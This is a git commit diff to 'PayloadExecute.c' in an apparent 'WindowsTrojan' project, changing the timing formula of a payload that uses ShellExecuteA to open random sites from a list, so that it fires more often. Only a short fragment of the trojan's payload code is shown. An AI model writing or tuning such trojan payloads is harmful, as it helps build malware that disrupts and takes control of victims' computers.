9f56cded7a4d5210c9d6b19f30ce666da690ae3b
An-random-creator <158004969+An-random-creator@users.noreply.github.com>
2024-01-28 19:05:23 -0700

    Update PayloadExecute.c

--- WindowsTrojan/Source/Payloads/PayloadExecute.c
+++ WindowsTrojan/Source/Payloads/PayloadExecute.c
@@ -5,5 +5,5 @@ PAYLOADFUNCTIONDEFAULT(payloadExecute) {
 
 	ShellExecuteA(NULL, "open", (LPCSTR)Sites[random() % SitesLen], NULL, NULL, SW_SHOWDEFAULT);
 
-	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
+	out: return 600.0 / (times / 6.0 + 1) + 100 + (random() % 200);
 }
